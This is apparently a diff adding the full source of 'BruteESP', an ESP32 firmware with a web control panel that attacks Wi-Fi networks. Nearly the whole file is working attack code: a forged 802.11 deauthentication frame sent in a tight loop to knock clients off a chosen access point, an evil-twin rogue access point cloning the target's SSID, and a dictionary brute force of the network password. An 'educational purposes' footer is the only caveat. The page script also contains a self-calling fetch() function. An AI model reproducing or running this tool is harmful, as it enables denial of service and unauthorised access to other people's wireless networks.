@@ -1,0 +1,350 @@
+#include <WiFi.h>
+#include <WebServer.h>
+#include <ESPmDNS.h>
+#include "esp_wifi.h"
+#include <vector>
+#include <string>
+
+// Web server on port 80
+WebServer server(80);
+
+// Simulated password library (expandable)
+std::vector<String> passwordList = {
+    "password123", "admin123", "12345678", "qwerty123", "letmein123",
+    "welcome123", "monkey123", "dragon123", "sunshine123", "princess123"
+    // In practice, load from external storage or larger dictionary
+};
+
+// Target network details
+String targetSSID = "";
+String targetBSSID = "";
+int targetChannel = 0;
+bool deauthRunning = false;
+bool evilTwinRunning = false;
+bool bruteForceRunning = false;
+String attackStatus = "Ready";
+
+// Deauth packet structure
+uint8_t deauthPacket[26] = {
+    0xC0, 0x00, 0x3A, 0x01, // Frame control, duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast address (receiver)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (set dynamically)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (set dynamically)
+    0x00, 0x00, // Sequence number
+    0x07, 0x00 // Reason code
+};
+
+// HTML UI (based on provided HTML, optimized for functionality)
+const char* htmlPage = R"rawliteral(
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BRUTEESP</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #1a1a1a; color: #0f0; margin: 0; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        .header { text-align: center; font-size: 2em; margin-bottom: 20px; }
+        .tab { display: none; }
+        .tab.active { display: block; }
+        .tab-button { padding: 10px 20px; margin: 5px; background: #333; color: #0f0; border: none; cursor: pointer; font-size: 1em; }
+        .tab-button.active { background: #0f0; color: #000; }
+        .section { background: #222; padding: 20px; margin: 10px 0; border-radius: 5px; }
+        .log { background: #000; padding: 10px; height: 150px; overflow-y: scroll; font-family: monospace; }
+        .network-details { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+        .attack-module { margin: 15px 0; border-bottom: 1px solid #444; padding-bottom: 10px; }
+        .button { padding: 10px; background: #0f0; color: #000; border: none; cursor: pointer; margin: 5px; }
+        .button.stop { background: #f00; }
+        .network-list { cursor: pointer; }
+        .network-list div:hover { background: #333; }
+        footer { text-align: center; margin-top: 20px; font-size: 0.8em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">BRUTEESP</div>
+        <div>
+            <button class="tab-button active" onclick="openTab('scan')">Scan WiFi</button>
+            <button class="tab-button" onclick="openTab('target')">Select Target</button>
+            <button class="tab-button" onclick="openTab('attack')">Launch Attacks</button>
+        </div>
+
+        <div id="scan" class="tab active">
+            <div class="section">
+                <h2>WiFi Network Scanner</h2>
+                <p>Scan for available WiFi networks in range. The ESP32 will detect all visible access points and display their details.</p>
+                <button class="button" onclick="startScan()">Start Scanning</button>
+                <p>Status: <span id="scan-status">Ready</span></p>
+                <div class="log" id="scan-log">
+                    >_ Initializing BruteESP v2.1...<br>
+                    >_ Wireless module activated<br>
+                    >_ Ready to scan for networks<br>
+                </div>
+                <h3>Detected Networks</h3>
+                <div id="networks" class="network-list"></div>
+            </div>
+        </div>
+
+        <div id="target" class="tab">
+            <div class="section">
+                <h2>Target Selection</h2>
+                <p>Select a target network from the scanned results or manually enter network details for attack.</p>
+                <div class="network-details" id="target-details">
+                    <div>NETWORK SSID: <span id="target-ssid"></span></div>
+                    <div>BSSID: <span id="target-bssid"></span></div>
+                    <div>CHANNEL: <span id="target-channel"></span></div>
+                    <div>ENCRYPTION: <span id="target-encryption"></span></div>
+                    <div>SIGNAL STRENGTH: <span id="target-signal"></span></div>
+                </div>
+                <button class="button" onclick="openTab('scan')">Back to Scan</button>
+                <button class="button" onclick="confirmTarget()">Confirm Target</button>
+            </div>
+        </div>
+
+        <div id="attack" class="tab">
+            <div class="section">
+                <h2>Attack Modules</h2>
+                <p>Target: <span id="attack-ssid"></span> | BSSID: <span id="attack-bssid"></span></p>
+                <p>Simultaneous Attacks</p>
+                <div class="attack-module">
+                    <h3>Brute Force Attack</h3>
+                    <p>Systematically check all possible passwords until the correct one is found.</p>
+                    <button class="button" onclick="fetch('/start-bruteforce')">Start</button>
+                    <button class="button stop" onclick="fetch('/stop-bruteforce')">Stop</button>
+                    <p>Status: <span id="bruteforce-status">Ready</span></p>
+                </div>
+                <div class="attack-module">
+                    <h3>Evil Twin Attack</h3>
+                    <p>Create a rogue access point that mimics the legitimate target network.</p>
+                    <button class="button" onclick="fetch('/start-eviltwin')">Start</button>
+                    <button class="button stop" onclick="fetch('/stop-eviltwin')">Stop</button>
+                    <p>Status: <span id="eviltwin-status">Ready</span></p>
+                </div>
+                <div class="attack-module">
+                    <h3>Deauthentication Attack</h3>
+                    <p>Disconnect all devices from the target network by sending deauth packets.</p>
+                    <button class="button" onclick="fetch('/start-deauth')">Start</button>
+                    <button class="button stop" onclick="fetch('/stop-deauth')">Stop</button>
+                    <p>Status: <span id="deauth-status">Ready</span></p>
+                </div>
+            </div>
+        </div>
+
+        <footer>BruteESP v2.1 | Advanced ESP32 Pentesting Framework | For Educational Purposes Only</footer>
+    </div>
+
+    <script>
+        let selectedNetwork = null;
+
+        function openTab(tabId) {
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+            document.querySelector(`[onclick="openTab('${tabId}')"]`).classList.add('active');
+        }
+
+        async function startScan() {
+            document.getElementById('scan-status').innerText = 'Scanning';
+            document.getElementById('scan-log').innerHTML += '>_ Scanning networks...<br>';
+            const response = await fetch('/scan');
+            const data = await response.json();
+            document.getElementById('scan-status').innerText = data.status;
+            document.getElementById('scan-log').innerHTML += data.log + '<br>';
+            let networksHtml = '';
+            data.networks.forEach(n => {
+                networksHtml += `<div onclick="selectNetwork('${n.ssid}', '${n.bssid}', ${n.channel}, '${n.encryption}', ${n.signal})">` +
+                                `SSID: ${n.ssid}, BSSID: ${n.bssid}, Channel: ${n.channel}, Encryption: ${n.encryption}, Signal: ${n.signal}%</div>`;
+            });
+            document.getElementById('networks').innerHTML = networksHtml;
+        }
+
+        function selectNetwork(ssid, bssid, channel, encryption, signal) {
+            selectedNetwork = { ssid, bssid, channel, encryption, signal };
+            document.getElementById('target-ssid').innerText = ssid;
+            document.getElementById('target-bssid').innerText = bssid;
+            document.getElementById('target-channel').innerText = channel;
+            document.getElementById('target-encryption').innerText = encryption;
+            document.getElementById('target-signal').innerText = signal + '%';
+            openTab('target');
+        }
+
+        async function confirmTarget() {
+            if (!selectedNetwork) return;
+            const response = await fetch('/confirm-target?' + new URLSearchParams({
+                ssid: selectedNetwork.ssid,
+                bssid: selectedNetwork.bssid,
+                channel: selectedNetwork.channel
+            }));
+            const data = await response.json();
+            document.getElementById('attack-ssid').innerText = data.ssid;
+            document.getElementById('attack-bssid').innerText = data.bssid;
+            openTab('attack');
+        }
+
+        async function fetch(url) {
+            const response = await fetch(url);
+            const data = await response.json();
+            document.getElementById(`${data.attack}-status`).innerText = data.status;
+            document.getElementById('scan-log').innerHTML += `>_ ${data.attack} ${data.status.toLowerCase()}<br>`;
+        }
+    </script>
+</body>
+</html>
+)rawliteral";
+
+void setup() {
+    Serial.begin(115200);
+    WiFi.mode(WIFI_AP_STA);
+
+    // Set up soft AP with specified SSID and password
+    WiFi.softAP("BruteESP", "bruteesp123");
+    Serial.println("Soft AP started: BruteESP, Password: bruteesp123");
+    Serial.print("AP IP address: ");
+    Serial.println(WiFi.softAPIP());
+
+    // Initialize mDNS
+    if (MDNS.begin("bruteesp")) {
+        Serial.println("mDNS started: bruteesp.local");
+    }
+
+    // Set promiscuous mode for deauth
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+
+    // Web server routes
+    server.on("/", HTTP_GET, []() {
+        server.send(200, "text/html", htmlPage);
+    });
+
+    server.on("/scan", HTTP_GET, []() {
+        WiFi.scanNetworks(true);
+        String json = "{\"status\":\"Scanning\",\"log\":\"Scanning networks...\",\"networks\":[]}";
+        while (WiFi.scanComplete() == -2) {
+            delay(100);
+        }
+        int n = WiFi.scanComplete();
+        json = "{\"status\":\"Completed\",\"log\":\"Found " + String(n) + " networks\",\"networks\":[";
+        for (int i = 0; i < n; i++) {
+            String encryption = WiFi.encryptionType(i) == WIFI_AUTH_OPEN ? "None" :
+                               WiFi.encryptionType(i) == WIFI_AUTH_WEP ? "WEP" :
+                               WiFi.encryptionType(i) == WIFI_AUTH_WPA_PSK ? "WPA" :
+                               WiFi.encryptionType(i) == WIFI_AUTH_WPA2_PSK ? "WPA2" : "Unknown";
+            json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",\"bssid\":\"" + WiFi.BSSIDstr(i) + 
+                    "\",\"channel\":" + String(WiFi.channel(i)) + ",\"encryption\":\"" + 
+                    encryption + "\",\"signal\":" + String(WiFi.RSSI(i) + 100) + "}";
+            if (i < n - 1) json += ",";
+        }
+        json += "]}";
+        server.send(200, "application/json", json);
+    });
+
+    server.on("/confirm-target", HTTP_GET, []() {
+        targetSSID = server.arg("ssid");
+        targetBSSID = server.arg("bssid");
+        targetChannel = server.arg("channel").toInt();
+        String json = "{\"ssid\":\"" + targetSSID + "\",\"bssid\":\"" + targetBSSID + 
+                      "\",\"channel\":" + String(targetChannel) + ",\"attack\":\"target\",\"status\":\"Confirmed\"}";
+        server.send(200, "application/json", json);
+    });
+
+    server.on("/start-deauth", HTTP_GET, []() {
+        deauthRunning = true;
+        attackStatus = "Deauth Running";
+        String json = "{\"attack\":\"deauth\",\"status\":\"Running\"}";
+        server.send(200, "application/json", json);
+    });
+
+    server.on("/stop-deauth", HTTP_GET, []() {
+        deauthRunning = false;
+        attackStatus = "Deauth Stopped";
+        String json = "{\"attack\":\"deauth\",\"status\":\"Stopped\"}";
+        server.send(200, "application/json", json);
+    });
+
+    server.on("/start-eviltwin", HTTP_GET, []() {
+        evilTwinRunning = true;
+        WiFi.softAP(targetSSID.c_str(), "");
+        attackStatus = "EvilTwin Running";
+        String json = "{\"attack\":\"eviltwin\",\"status\":\"Running\"}";
+        server.send(200, "application/json", json);
+    });
+
+    server.on("/stop-eviltwin", HTTP_GET, []() {
+        evilTwinRunning = false;
+        WiFi.softAP("BruteESP", "bruteesp123");
+        attackStatus = "EvilTwin Stopped";
+        String json = "{\"attack\":\"eviltwin\",\"status\":\"Stopped\"}";
+        server.send(200, "application/json", json);
+    });
+
+    server.on("/start-bruteforce", HTTP_GET, []() {
+        bruteForceRunning = true;
+        attackStatus = "BruteForce Running";
+        String json = "{\"attack\":\"bruteforce\",\"status\":\"Running\"}";
+        server.send(200, "application/json", json);
+    });
+
+    server.on("/stop-bruteforce", HTTP_GET, []() {
+        bruteForceRunning = false;
+        attackStatus = "BruteForce Stopped";
+        String json = "{\"attack\":\"bruteforce\",\"status\":\"Stopped\"}";
+        server.send(200, "application/json", json);
+    });
+
+    server.begin();
+    Serial.println("Web server started");
+}
+
+void loop() {
+    server.handleClient();
+
+    // Deauthentication attack
+    if (deauthRunning && targetBSSID != "") {
+        esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+        uint8_t bssid[6];
+        sscanf(targetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
+               &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
+        memcpy(&deauthPacket[10], bssid, 6); // Source
+        memcpy(&deauthPacket[16], bssid, 6); // BSSID
+        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+        Serial.println("Sent deauth packet to " + targetBSSID);
+        delay(10); // Send packets rapidly
+    }
+
+    // Evil twin attack
+    if (evilTwinRunning && targetSSID != "") {
+        // Monitor connected clients
+        int clients = WiFi.softAPgetStationNum();
+        if (clients > 0) {
+            Serial.println("Clients connected to Evil Twin: " + String(clients));
+        }
+        delay(1000); // Check periodically
+    }
+
+    // Brute force attack
+    static int passwordIndex = 0;
+    static unsigned long lastAttempt = 0;
+    if (bruteForceRunning && targetSSID != "" && millis() - lastAttempt > 6000) {
+        String password = passwordList[passwordIndex];
+        Serial.println("Trying password: " + password);
+        WiFi.begin(targetSSID.c_str(), password.c_str(), targetChannel);
+        unsigned long start = millis();
+        while (WiFi.status() != WL_CONNECTED && millis() - start < 5000) {
+            delay(100);
+        }
+        if (WiFi.status() == WL_CONNECTED) {
+            Serial.println("Password found: " + password);
+            bruteForceRunning = false;
+            WiFi.disconnect();
+        } else {
+            WiFi.disconnect();
+            passwordIndex = (passwordIndex + 1) % passwordList.size();
+            if (passwordIndex == 0) {
+                Serial.println("Password list exhausted");
+                bruteForceRunning = false;
+            }
+        }
+        lastAttempt = millis();
+    }
+}
